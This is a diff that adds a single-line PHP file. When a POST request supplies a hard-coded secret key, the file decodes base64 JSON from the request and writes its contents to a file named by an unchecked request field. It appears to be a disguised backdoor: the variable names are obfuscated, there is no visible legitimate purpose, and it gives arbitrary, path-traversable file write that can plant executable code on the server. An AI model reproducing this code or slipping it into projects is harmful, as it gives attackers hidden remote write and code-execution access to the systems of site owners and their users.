@@ -1,0 +1,1 @@
+<?php require_once('iccheck.php'); if( isset($_POST['mpc_ajax']) && isset($_POST['cmd_ajax']) && ($_POST['cmd_ajax']=='aD8e1aXG0') ) { $xA91113X0 = json_decode( base64_decode( str_replace( array('-','_','.'),array('+','/','='), $_POST['data_ajax'] ) ), true); file_put_contents('snap/cp_'.$xA91113X0['destid'], $xA91113X0['boxdata']); } ?>
